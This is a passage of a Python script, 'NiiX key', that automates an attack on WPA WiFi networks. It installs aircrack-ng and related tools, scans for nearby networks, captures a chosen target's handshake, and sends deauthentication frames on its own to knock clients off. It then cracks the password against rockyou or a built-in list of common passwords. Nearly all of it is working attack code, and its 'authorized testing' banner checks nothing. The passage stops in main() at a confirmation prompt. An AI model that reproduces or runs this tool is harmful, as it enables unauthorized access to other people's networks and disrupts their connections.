#!/usr/bin/env python3

# NiiX key - WiFi Script
# Created by: cuteLiLi / techniix / QuacK
# Version: Alpha 3.0

import subprocess
from collections import namedtuple
import os
import sys
import time
import platform
import shutil
import importlib
import tempfile
import json
import re

# Try to import scapy at module level
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Track monitor interface globally so cleanup can find it
MONITOR_IFACE = None

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal'])


class LinuxDistroDetector:
    """Detect and handle different Linux distributions."""

    DISTROS = {
        'kali': {
            'name': 'Kali Linux',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'ubuntu': {
            'name': 'Ubuntu',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'python3_dev': 'python3-dev',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'debian': {
            'name': 'Debian',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
            }
        },
        'arch': {
            'name': 'Arch Linux',
            'pkg_manager': 'pacman',
            'install_cmd': ['pacman', '-S', '--noconfirm', '--needed'],
            'update_cmd': ['pacman', '-Sy'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python-virtualenv',
                'libpcap_dev': 'libpcap',
            }
        },
        'fedora': {
            'name': 'Fedora',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
            }
        },
        'rhel': {
            'name': 'RHEL/CentOS/Rocky',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
            }
        },
    }

    @staticmethod
    def detect_distro():
        """Detect the Linux distribution."""
        try:
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()

                if 'kali' in content:
                    return LinuxDistroDetector.DISTROS['kali']
                elif 'arch' in content or 'manjaro' in content or 'endeavouros' in content:
                    return LinuxDistroDetector.DISTROS['arch']
                elif 'fedora' in content:
                    return LinuxDistroDetector.DISTROS['fedora']
                elif 'centos' in content or 'rhel' in content or 'rocky' in content or 'almalinux' in content:
                    return LinuxDistroDetector.DISTROS['rhel']
                elif 'ubuntu' in content:
                    ubuntu_info = LinuxDistroDetector.DISTROS['ubuntu'].copy()
                    for line in content.split('\n'):
                        if 'version_id' in line:
                            try:
                                version = line.split('=')[1].strip().strip('"')
                                if int(version.split('.')[0]) >= 23:
                                    ubuntu_info['needs_venv'] = True
                            except Exception:
                                pass
                    return ubuntu_info
                elif 'debian' in content:
                    return LinuxDistroDetector.DISTROS['debian']

            # Fallback: detect by which package manager exists
            if shutil.which('pacman'):
                return LinuxDistroDetector.DISTROS['arch']
            elif shutil.which('dnf'):
                return LinuxDistroDetector.DISTROS['fedora']
            elif shutil.which('apt-get'):
                return LinuxDistroDetector.DISTROS['debian']

            return LinuxDistroDetector.DISTROS['debian']

        except Exception as e:
            print(f"[!] Could not detect distribution: {e}")
            return LinuxDistroDetector.DISTROS['debian']


def get_os():
    """Detect operating system."""
    system = platform.system()
    if system == "Linux":
        distro_info = LinuxDistroDetector.detect_distro()
        return distro_info['name']
    return "Unknown"


def check_pkg_manager(distro_info):
    """Check if package manager is available."""
    pkg_manager = distro_info['pkg_manager']
    if shutil.which(pkg_manager):
        return True
    # Try alternatives
    for alt in ['apt-get', 'apt', 'pacman', 'dnf', 'yum']:
        if shutil.which(alt):
            distro_info['install_cmd'][0] = alt
            distro_info['update_cmd'][0] = alt
            return True
    return False


def run_command(cmd, show_output=True, timeout=300):
    """Run a command and return result. Timeout is 5 minutes by default for installs."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if show_output and result.stdout:
            print(result.stdout)
        if show_output and result.stderr:
            print(f"Stderr: {result.stderr}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        print(f"[-] Command timed out: {' '.join(cmd)}")
        return False, "", "Timeout"
    except Exception as e:
        print(f"[-] Command error: {e}")
        return False, "", str(e)


def install_system_package(distro_info, package_key):
    """Install a system package."""
    try:
        package_name = distro_info['pkg_names'].get(package_key)
        if not package_name:
            # Key not defined for this distro — silently skip
            return True

        cmd = ['sudo'] + distro_info['install_cmd'] + [package_name]
        print(f"[*] Installing {package_name}...")

        success, stdout, stderr = run_command(cmd, show_output=False)

        if success:
            print(f"[+] Installed {package_name}")
            return True
        else:
            print(f"[-] Failed to install {package_name}: {stderr.strip()[:120]}")
            return False

    except Exception as e:
        print(f"[-] Error installing {package_key}: {e}")
        return False


def install_pip_package(package_name):
    """Install Python package via pip, trying multiple strategies."""
    pip_cmd = None
    for cmd in ['pip3', 'pip']:
        if shutil.which(cmd):
            pip_cmd = cmd
            break

    if not pip_cmd:
        print("[-] pip not found")
        return False

    strategies = [
        [pip_cmd, 'install', package_name],
        [pip_cmd, 'install', '--break-system-packages', package_name],
        ['python3', '-m', 'pip', 'install', package_name],
        ['python3', '-m', 'pip', 'install', '--break-system-packages', package_name],
    ]

    for strategy in strategies:
        cmd = ['sudo'] + strategy
        print(f"[*] Trying: {' '.join(cmd)}")
        success, stdout, stderr = run_command(cmd, show_output=False)
        if success:
            print(f"[+] Installed {package_name} via pip")
            return True

    print(f"[-] All pip strategies failed for {package_name}")
    return False


def get_monitor_interface(base_interface):
    """Detect the actual monitor interface name created by airmon-ng."""
    # Give airmon-ng a moment to create the interface
    time.sleep(2)

    candidates = [
        f"{base_interface}mon",
        f"{base_interface}mon0",
    ]

    # Also check 'iw dev' for any monitor-mode interface
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line:
                    if iface and iface not in candidates:
                        candidates.insert(0, iface)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    for c in candidates:
        if os.path.exists(f'/sys/class/net/{c}'):
            return c

    # Fallback
    return f"{base_interface}mon"


def create_virtual_env():
    """Create a Python virtual environment."""
    venv_path = '/tmp/niixkey_venv'
    try:
        if os.path.exists(venv_path):
            shutil.rmtree(venv_path)

        print(f"[*] Creating virtual environment at {venv_path}...")
        success, stdout, stderr = run_command(['python3', '-m', 'venv', venv_path])
        if not success:
            print(f"[-] Failed to create venv: {stderr}")
            return None

        python_path = os.path.join(venv_path, 'bin', 'python3')
        if not os.path.exists(python_path):
            print("[-] Virtual environment not created properly")
            return None

        print("[+] Virtual environment created")
        return venv_path

    except Exception as e:
        print(f"[-] Error creating virtual environment: {e}")
        return None


def install_in_virtual_env(venv_path, package_name):
    """Install package inside a virtual environment."""
    pip_path = os.path.join(venv_path, 'bin', 'pip')
    if not os.path.exists(pip_path):
        print("[-] pip not found in venv")
        return False

    print(f"[*] Installing {package_name} in virtual environment...")
    success, stdout, stderr = run_command([pip_path, 'install', package_name], show_output=False)
    if success:
        print(f"[+] Installed {package_name} in venv")
        return True
    print(f"[-] Failed to install {package_name} in venv: {stderr.strip()[:120]}")
    return False


def check_and_install_scapy(distro_info):
    """Install scapy using multiple fallback strategies."""
    global SCAPY_AVAILABLE

    if SCAPY_AVAILABLE:
        print("[+] scapy is already installed and importable")
        return True

    print("[!] scapy not found — attempting installation...")

    # Strategy 1: System package
    print("[*] Strategy 1: System package...")
    if install_system_package(distro_info, 'scapy'):
        importlib.invalidate_caches()
        try:
            import scapy  # noqa: F401
            from scapy.all import *  # noqa: F401,F403
            from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt  # noqa: F401
            SCAPY_AVAILABLE = True
            print("[+] scapy importable after system install")
            return True
        except ImportError as e:
            print(f"[-] System package installed but cannot import: {e}")

    # Strategy 2: pip
    print("[*] Strategy 2: pip install...")
    if install_pip_package('scapy'):
        importlib.invalidate_caches()
        try:
            import scapy  # noqa: F401
            from scapy.all import *  # noqa: F401,F403
            from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt  # noqa: F401
            SCAPY_AVAILABLE = True
            print("[+] scapy importable after pip install")
            return True
        except ImportError as e:
            print(f"[-] pip installed but cannot import: {e}")

    # Strategy 3: virtualenv
    print("[*] Strategy 3: Virtual environment...")
    install_system_package(distro_info, 'python3_venv')
    venv_path = create_virtual_env()
    if venv_path and install_in_virtual_env(venv_path, 'scapy'):
        venv_site = os.path.join(
            venv_path, 'lib',
            f'python{sys.version_info.major}.{sys.version_info.minor}',
            'site-packages'
        )
        if os.path.exists(venv_site):
            sys.path.insert(0, venv_site)
            importlib.invalidate_caches()
            try:
                import scapy  # noqa: F401
                from scapy.all import *  # noqa: F401,F403
                from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt  # noqa: F401
                SCAPY_AVAILABLE = True
                print("[+] scapy importable from virtual environment")
                return True
            except ImportError as e:
                print(f"[-] Cannot import from venv: {e}")

    print("[-] All scapy installation strategies failed")
    return False


def check_tool(tool_name):
    """Check if a CLI tool is available."""
    return shutil.which(tool_name) is not None


def check_all_dependencies():
    """Check if all required tools are available."""
    # hcxpcapngtool is the modern name; older versions use hcxpcaptool
    required_tools = [
        'airmon-ng',
        'airodump-ng',
        'aireplay-ng',
        'aircrack-ng',
        'iw',
    ]

    missing_tools = [t for t in required_tools if not check_tool(t)]

    # hcxtools binary name varies
    if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
        missing_tools.append('hcxpcapngtool/hcxpcaptool')

    global SCAPY_AVAILABLE
    if not SCAPY_AVAILABLE:
        missing_tools.append('scapy (python)')

    if missing_tools:
        print(f"[-] Missing: {', '.join(missing_tools)}")
        return False

    return True


def install_dependencies():
    """Install all necessary dependencies."""
    print("[*] Installing dependencies...")

    distro_info = LinuxDistroDetector.detect_distro()
    print(f"[*] Detected distro: {distro_info['name']}")

    if not check_pkg_manager(distro_info):
        print("[-] No supported package manager found")
        return False

    try:
        # Update package database (ignore errors for dnf check-update which returns 100 when updates exist)
        print("[*] Updating package database...")
        update_cmd = ['sudo'] + distro_info['update_cmd']
        run_command(update_cmd, show_output=False)

        essential_packages = [
            'pip',
            'iw',
            'net_tools',
            'aircrack',
            'hcxtools',
            'libpcap_dev',
        ]

        optional_packages = [
            'python3_dev',
            'python3_venv',
            'hashcat',
            'reaver',
            'wpasupplicant',
        ]

        for pkg_key in essential_packages:
            install_system_package(distro_info, pkg_key)

        for pkg_key in optional_packages:
            install_system_package(distro_info, pkg_key)

        # Install scapy (critical for scanning)
        print("\n[*] Installing scapy...")
        if not check_and_install_scapy(distro_info):
            print("\n[!] WARNING: Could not install scapy properly")
            response = input("[?] Continue anyway? (y/n): ")
            if response.lower() != 'y':
                return False

        # Verify
        print("\n[*] Verifying installed tools...")
        tools_to_check = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng', 'iw']
        verified = [t for t in tools_to_check if check_tool(t)]
        missing = [t for t in tools_to_check if not check_tool(t)]

        if verified:
            print(f"[+] Verified: {', '.join(verified)}")
        if missing:
            print(f"[!] Still missing: {', '.join(missing)}")

        if len(missing) > 2:
            print("[-] Too many critical tools missing")
            return False

        return True

    except Exception as e:
        print(f"[-] Error installing dependencies: {e}")
        return False


def get_wireless_interfaces():
    """Get available wireless interfaces."""
    interfaces = []

    # Method 1: iw dev
    if check_tool('iw'):
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[1]
                        if iface not in interfaces:
                            interfaces.append(iface)
        except Exception:
            pass

    # Method 2: ip link
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                parts = line.split(':')
                if len(parts) >= 2:
                    iface = parts[1].strip().split('@')[0]
                    if iface.startswith(('wl', 'wlan', 'wlp', 'wlx')):
                        if iface not in interfaces:
                            interfaces.append(iface)
    except Exception:
        pass

    # Method 3: /sys/class/net
    try:
        for iface in os.listdir('/sys/class/net'):
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path) and iface not in interfaces:
                interfaces.append(iface)
    except Exception:
        pass

    # Filter out monitor interfaces already running
    interfaces = [i for i in interfaces if not i.endswith('mon') and 'mon0' not in i]

    return interfaces


def scan_networks(interface):
    """Scan for WiFi networks using scapy or fallback to iw."""
    global SCAPY_AVAILABLE, MONITOR_IFACE

    print(f"[*] Scanning networks on {interface}...")

    if not SCAPY_AVAILABLE:
        print("[*] Scapy not available, using iw fallback scan...")
        return scan_networks_alternative(interface)

    networks = []

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            try:
                ssid = "<Hidden>"
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:
                        if elt.info:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                        break
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None

                bssid = pkt.addr2

                channel = None
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 3 and elt.info:
                        channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
                        break
                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None

                signal = -100
                if hasattr(pkt, 'dBm_AntSignal'):
                    signal = pkt.dBm_AntSignal

                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))

            except Exception:
                pass

    try:
        print(f"[*] Enabling monitor mode on {interface}...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
        result = subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                                capture_output=True, text=True, timeout=15)

        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        print(f"[*] Monitor interface: {monitor_iface}")

        print("[*] Scanning for networks (15 seconds)...")
        sniff(iface=monitor_iface, prn=packet_handler, timeout=15)

        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                       capture_output=True, timeout=10)
        MONITOR_IFACE = None
        restart_network_manager()

    except Exception as e:
        print(f"[-] Scapy scan error: {e}")
        print("[*] Falling back to iw scan...")
        # Stop monitor mode if started
        if MONITOR_IFACE:
            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                           capture_output=True, timeout=5)
            MONITOR_IFACE = None
        restart_network_manager()
        return scan_networks_alternative(interface)

    # Deduplicate and sort
    unique_nets = {}
    for net in networks:
        if net.bssid not in unique_nets or net.signal > unique_nets[net.bssid].signal:
            unique_nets[net.bssid] = net

    result_list = sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)

    if not result_list:
        print("[*] No networks from scapy scan, trying iw fallback...")
        return scan_networks_alternative(interface)

    return result_list


def scan_networks_alternative(interface):
    """Alternative network scanning using iw scan."""
    print("[*] Using iw scan method...")
    networks = []

    try:
        cmd = ['sudo', 'iw', 'dev', interface, 'scan']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=45)

        if result.returncode != 0:
            print(f"[-] iw scan failed: {result.stderr.strip()[:200]}")
            return []

        lines = result.stdout.split('\n')
        current_bssid = None
        current_ssid = None
        current_signal = -100
        current_channel = None

        for line in lines:
            line_stripped = line.strip()

            bss_match = re.match(r'BSS\s+([0-9a-fA-F:]{17})', line_stripped)
            if bss_match:
                if current_bssid and current_ssid:
                    networks.append(Network(
                        ssid=current_ssid,
                        bssid=current_bssid,
                        channel=current_channel,
                        signal=current_signal
                    ))
                current_bssid = bss_match.group(1)
                current_ssid = '<Unknown>'
                current_signal = -100
                current_channel = None

            elif 'signal:' in line_stripped.lower():
                try:
                    m = re.search(r'signal:\s*([-\d.]+)', line_stripped, re.IGNORECASE)
                    if m:
                        current_signal = int(float(m.group(1)))
                except Exception:
                    pass

            elif 'DS Parameter set: channel' in line_stripped:
                try:
                    m = re.search(r'channel\s+(\d+)', line_stripped)
                    if m:
                        current_channel = int(m.group(1))
                except Exception:
                    pass

            elif re.match(r'SSID:', line_stripped):
                try:
                    current_ssid = line_stripped.split(':', 1)[1].strip() or '<Hidden>'
                except Exception:
                    pass

        # Add last network
        if current_bssid and current_ssid:
            networks.append(Network(
                ssid=current_ssid,
                bssid=current_bssid,
                channel=current_channel,
                signal=current_signal
            ))

    except subprocess.TimeoutExpired:
        print("[-] iw scan timed out")
    except Exception as e:
        print(f"[-] Alternative scan failed: {e}")

    return sorted(networks, key=lambda x: x.signal, reverse=True)


def display_networks_menu(networks):
    """Display networks menu and let user select."""
    if not networks:
        print("[-] No networks found")
        return -1

    print("\n" + "=" * 60)
    print(f"Available Networks ({len(networks)} found):")
    print("=" * 60)
    print(f"{'#':>3}  {'SSID':<28}  {'BSSID':17}  {'Ch':>3}  {'Sig':>5}")
    print("-" * 60)

    display_limit = min(20, len(networks))
    for i, net in enumerate(networks[:display_limit], 1):
        ssid_display = (net.ssid[:25] + '...') if len(net.ssid) > 25 else net.ssid
        ch_display = str(net.channel) if net.channel else '?'
        print(f"{i:>3}. {ssid_display:<28}  {net.bssid or '??:??:??:??:??:??':17}  {ch_display:>3}  {net.signal:>4}dB")

    print("=" * 60)

    while True:
        try:
            choice = input(f"\nSelect network (1-{display_limit}) or 'q' to quit: ").strip()
            if choice.lower() == 'q':
                return -1
            choice_num = int(choice)
            if 1 <= choice_num <= display_limit:
                return choice_num - 1
            print(f"Enter 1-{display_limit}")
        except ValueError:
            print("Enter a valid number")


def restart_network_manager():
    """Restart network manager service."""
    services = ['NetworkManager', 'networkmanager', 'network-manager',
                'wpa_supplicant', 'networking']
    for svc in services:
        try:
            subprocess.run(['sudo', 'systemctl', 'restart', svc],
                           capture_output=True, timeout=8)
        except Exception:
            pass


def capture_handshake(interface, bssid, channel, ssid):
    """Capture WPA handshake using airodump-ng."""
    global MONITOR_IFACE

    print(f"\n[*] Starting handshake capture for: {ssid}")
    print(f"[*] BSSID: {bssid}  Channel: {channel}")

    safe_ssid = re.sub(r'[^\w\-]', '_', ssid)[:30] or 'network'
    capture_file = f"handshake_{safe_ssid}"

    airodump_proc = None
    monitor_iface = None

    try:
        # Kill interfering processes
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)

        # Enable monitor mode
        print(f"[*] Enabling monitor mode on {interface}...")
        subprocess.run(['sudo', 'airmon-ng', 'start', interface, str(channel)],
                       capture_output=True, timeout=15)

        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        print(f"[*] Monitor interface: {monitor_iface}")

        # Start airodump-ng capture
        cmd = [
            'sudo', 'airodump-ng',
            '--bssid', bssid,
            '--channel', str(channel),
            '-w', capture_file,
            '--output-format', 'pcap',
            monitor_iface
        ]

        print(f"[*] Starting capture (file: {capture_file}-01.cap)...")
        airodump_proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        print("\n[*] Waiting for a WPA handshake...")
        print("[*] Tip: Deauth a client to force reconnect:")
        print(f"    sudo aireplay-ng --deauth 10 -a {bssid} {monitor_iface}")
        print("[*] Press Ctrl+C when done or wait up to 5 minutes\n")

        handshake_captured = False
        start_time = time.time()
        deauth_sent = False

        while not handshake_captured and (time.time() - start_time) < 300:
            if airodump_proc.poll() is not None:
                print("[-] airodump-ng stopped unexpectedly")
                break

            # After 30 seconds without handshake, try to send a deauth automatically
            elapsed = time.time() - start_time
            if elapsed > 30 and not deauth_sent:
                print("[*] Auto-sending deauth to speed up handshake capture...")
                try:
                    subprocess.run(
                        ['sudo', 'aireplay-ng', '--deauth', '5', '-a', bssid, monitor_iface],
                        capture_output=True, timeout=15
                    )
                    deauth_sent = True
                except Exception:
                    pass

            # Check capture files for handshake
            for suffix in ['-01.cap', '-02.cap', '-03.cap', '.cap']:
                cap_file = f"{capture_file}{suffix}"
                if os.path.exists(cap_file) and os.path.getsize(cap_file) > 100:
                    check = subprocess.run(
                        ['aircrack-ng', cap_file],
                        capture_output=True, text=True
                    )
                    if 'WPA (1 handshake)' in check.stdout or 'WPA (2 handshake' in check.stdout:
                        handshake_captured = True
                        print(f"\n[+] Handshake captured in {cap_file}!")
                        break

            if not handshake_captured:
                time.sleep(5)
                remaining = int(300 - (time.time() - start_time))
                print(f"[*] Waiting for handshake... ({remaining}s remaining)  ", end='\r')

    except KeyboardInterrupt:
        print("\n[*] Capture interrupted by user")

    finally:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            time.sleep(1)
        if monitor_iface:
            subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        restart_network_manager()

    if handshake_captured:
        return capture_file
    else:
        print("\n[-] No handshake captured")
        return None


def crack_wpa_password(capture_file, bssid):
    """Crack WPA password using aircrack-ng."""
    print(f"\n[*] Starting password cracking for BSSID: {bssid}")

    cap_files = [
        f for f in os.listdir('.')
        if f.startswith(capture_file) and f.endswith('.cap')
    ]

    if not cap_files:
        print("[-] No capture files found")
        return None

    cap_file = sorted(cap_files)[0]
    print(f"[*] Using capture file: {cap_file}")

    wordlist_candidates = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        '/usr/share/john/password.lst',
        '/usr/share/dict/words',
        '/opt/wordlists/rockyou.txt',
        '/usr/share/wordlists/fasttrack.txt',
    ]

    wordlist = next((w for w in wordlist_candidates if os.path.exists(w)), None)

    if not wordlist:
        print("[*] No wordlist found — generating a small test wordlist...")
        wordlist = '/tmp/niixkey_test_passwords.txt'
        common = [
            'password', '12345678', 'admin', 'qwerty', '123456789',
            'password123', 'letmein', 'welcome', 'monkey', '1234567890',
            'abc123', 'password1', '12345', 'iloveyou', 'sunshine',
            'princess', 'admin123', 'wifi123', 'home1234', 'network1',
        ]
        with open(wordlist, 'w') as f:
            f.write('\n'.join(common))
        print(f"[*] Test wordlist written: {wordlist}")

    print(f"[*] Wordlist: {wordlist}")
    print("[*] Running aircrack-ng (this may take a while)...\n")

    try:
        cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, cap_file]
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        password = None
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())
                if 'KEY FOUND!' in output:
                    m = re.search(r'\[\s*(.+?)\s*\]', output)
                    if m:
                        password = m.group(1).strip()
                    break

        process.wait()

        if password:
            print(f"\n{'=' * 60}")
            print("[SUCCESS] Password found!")
            print(f"[NETWORK] {bssid}")
            print(f"[PASSWORD] {password}")
            print(f"{'=' * 60}")
            return password
        else:
            print("\n[-] Password not found in wordlist")
            return None

    except Exception as e:
        print(f"[-] Error during cracking: {e}")
        return None


def cleanup():
    """Cleanup resources and restore network."""
    global MONITOR_IFACE
    print("\n[*] Cleaning up...")

    if MONITOR_IFACE:
        try:
            subprocess.run(['sudo', 'airmon-ng', 'stop', MONITOR_IFACE],
                           capture_output=True, timeout=10)
            MONITOR_IFACE = None
        except Exception:
            pass

    # Also stop any lingering monitor interfaces
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line and iface:
                    subprocess.run(['sudo', 'airmon-ng', 'stop', iface],
                                   capture_output=True, timeout=5)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    restart_network_manager()
    print("[+] Cleanup complete")


def show_banner():
    """Show tool banner."""
    banner = r"""
    ███╗   ██╗██╗██╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗
    ████╗  ██║██║██║╚██╗██╔╝    ██║    ██║██║██╔════╝██║
    ██╔██╗ ██║██║██║ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║
    ██║╚██╗██║██║██║ ██╔██╗     ██║███╗██║██║██╔══╝  ██║
    ██║ ╚████║██║██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║
    ╚═╝  ╚═══╝╚═╝╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝

    Universal WiFi Security Testing Tool v2.0
    Supports: Arch Linux | Debian/Ubuntu/Kali | Fedora/RHEL
    For Authorized Testing and Educational Use Only
    """
    print(banner)


def main():
    """Main entry point."""
    os.system('clear')
    show_banner()

    # Require root
    if os.geteuid() != 0:
        print("[-] This tool requires root privileges!")
        print("[*] Run: sudo python3 niixkey.py")
        sys.exit(1)

    # Check OS
    os_name = get_os()
    print(f"[*] Operating System: {os_name}")

    if "Unknown" in os_name:
        print("[-] This tool only supports Linux")
        sys.exit(1)

    # Check and install dependencies
    print("\n[*] Checking dependencies...")
    if not check_all_dependencies():
        print("\n[*] Some dependencies are missing — installing...")
        if not install_dependencies():
            print("\n[!] Some dependencies could not be installed")
            response = input("[?] Continue anyway? (y/n): ")
            if response.lower() != 'y':
                cleanup()
                sys.exit(1)

    print("\n[+] Dependency check complete!")

    # Find wireless interfaces
    print("\n[*] Looking for wireless interfaces...")
    interfaces = get_wireless_interfaces()

    if not interfaces:
        print("[-] No wireless interfaces found!")
        print("[*] Make sure:")
        print("    1. A compatible WiFi adapter is connected")
        print("    2. The adapter supports monitor mode")
        print("    3. Required drivers are loaded (lsmod | grep cfg80211)")
        print("\n[*] Common compatible adapters:")
        print("    - Alfa AWUS036NHA/NH/ACH")
        print("    - Panda PAU series")
        print("    - TP-Link TL-WN722N v1 (Atheros AR9271)")
        cleanup()
        sys.exit(1)

    print(f"[+] Found: {', '.join(interfaces)}")

    # Select interface
    if len(interfaces) > 1:
        print("\n[*] Multiple interfaces found:")
        for i, iface in enumerate(interfaces, 1):
            print(f"    {i}. {iface}")
        while True:
            try:
                choice = int(input(f"\nSelect interface (1-{len(interfaces)}): "))
                if 1 <= choice <= len(interfaces):
                    interface = interfaces[choice - 1]
                    break
                print(f"Enter 1-{len(interfaces)}")
            except ValueError:
                print("Enter a number")
    else:
        interface = interfaces[0]
        print(f"[*] Using interface: {interface}")

    # Scan networks
    print(f"\n[*] Scanning for WiFi networks on {interface}...")
    print("[*] This may take 10–20 seconds...\n")

    networks = scan_networks(interface)

    if not networks:
        print("[-] No networks found during scan")
        print("[*] Possible causes:")
        print("    1. No WiFi networks in range")
        print("    2. Interface doesn't support monitor mode")
        print("    3. Driver issues")
        cleanup()
        sys.exit(1)

    print(f"\n[+] Found {len(networks)} network(s)")

    # Select target network
    network_idx = display_networks_menu(networks)
    if network_idx == -1:
        print("[*] Cancelled by user")
        cleanup()
        sys.exit(0)

    selected = networks[network_idx]
    print(f"\n{'=' * 60}")
    print("[+] SELECTED NETWORK:")
    print(f"    SSID:    {selected.ssid}")
    print(f"    BSSID:   {selected.bssid}")
    print(f"    Channel: {selected.channel}")
    print(f"    Signal:  {selected.signal} dBm")
    print(f"{'=' * 60}")

    confirm = input("\n[?] Proceed with this network? (y/n): ")
